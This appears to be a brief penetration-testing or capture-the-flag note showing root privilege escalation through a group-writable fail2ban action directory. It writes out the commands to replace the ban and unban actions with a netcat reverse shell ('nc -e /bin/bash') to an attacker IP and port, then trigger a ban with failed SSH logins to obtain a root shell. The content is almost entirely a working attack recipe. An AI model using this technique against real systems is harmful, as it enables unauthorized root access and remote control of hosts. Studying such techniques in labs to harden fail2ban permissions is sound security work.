# fail2ban

```
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

[https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

```
$ /etc/init.d/fail2ban status

$ ls -lh /etc/fail2ban
drwxrwxr-x  2 root fail2ban 4.0K Dec  3  2020 action.d

# /etc/fail2ban/action.d is WRITABLE by fail2ban group

$ cd /etc/fail2ban/action.d
$ vim iptables-multiport.conf

#Edit as following
*****************************
actionban = /usr/bin/nc -e /bin/bash 192.168.49.145 4444
actionunban = /usr/bin/nc -e /bin/bash 192.168.49.145 4444
*****************************

#Couple times with wrong pass then got root shell
$ ssh fox@192.168.145.126
```
